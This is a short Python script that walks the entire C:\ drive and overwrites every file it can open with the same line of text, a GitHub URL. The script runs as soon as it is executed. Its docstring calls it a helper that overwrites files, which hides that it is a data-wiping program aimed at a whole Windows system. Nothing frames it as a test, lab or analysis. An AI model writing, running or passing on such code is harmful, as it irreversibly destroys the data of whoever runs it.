import os

def overwrite_files(directory, new_content):
    """
    Overwrites the contents of all files in a directory that do not require elevated permissions.
    
    Args:
    - directory: The directory path where the files are located.
    - new_content: The new content to write into the files.
    """
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'w') as f:
                    f.write(new_content)
                print(f"File '{file}' overwritten.")
            except PermissionError:
                print(f"Skipping '{file_path}': Permission denied.")
            except Exception as e:
                print(f"Failed to overwrite '{file_path}': {e}")

# Set the root directory path
root_directory = 'C:\\'
new_content = "https://github.com/TheMoog3/very-bad/tree/main"

overwrite_files(root_directory, new_content)
